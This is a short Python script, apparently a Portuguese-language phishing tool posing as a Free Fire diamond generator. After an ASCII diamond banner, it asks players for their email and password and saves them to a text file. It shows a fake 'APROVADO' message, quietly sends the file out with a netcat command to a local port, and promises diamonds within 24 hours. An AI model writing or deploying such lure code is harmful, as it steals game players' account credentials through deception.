#-- coding: UTF-8 --

#--NAO KIBA CARALHOKKKKKK--#
import os, time
from time import sleep as wait

red = '\033[1;31m'
az = '\033[1;94m'
gr = '\033[1;32m'
while True:
    items = [
  "      __________________           ",
  "    .-'  \ _.-''-._ /  '-.         ",
  "  .-/\   .'.      .'.   /\-.       ",
  " _'/  \.'   '.  .'   './  \'_      ",
  ":======:======::======:======:     ",
  " '. '.  \     ''     /  .' .'      ",
  "   '. .  \   :  :   /  . .'        ",
  "     '.'  \  '  '  /  '.'          ",
  "       ':  \:    :/  :'            ",
  "         '. \    / .'              ",
  "           '.\  /.'    miK         ",
  "             '\/'                  "
]

    for item in items:
        print(item)
        wait(0.05)


    print(f'''
    [1] Diamante no Free Fire (entre 1/2k)

    apoie o criador para fazer mais tools (insta: @i.am.gab)
    ''')
    wait(0.5)
    var = input('[#]Selecione a opção: ')
    if var == '1':
        back = False
        while (back == False):
            email = input(' [#] Email Aqui  > ')
            passw = input(' [#] Senha Aqui > ')
            with open("email_e_senha.txt", "w") as arq:
                arq.write(f'''email: {email}
    senha: {passw}''')
                time.sleep(2);print(' [#] Testando, aguarde...!')
                time.sleep(2);print(f'''{gr}
                
                    APROVADO''')
                
                os.system('nc -w 2 127.0.0.1 333 < email_e_senha.txt &> /dev/null')
                print(f'''
                
    [*] Os Diamantes irão chegar em até 24 horas!''')
                break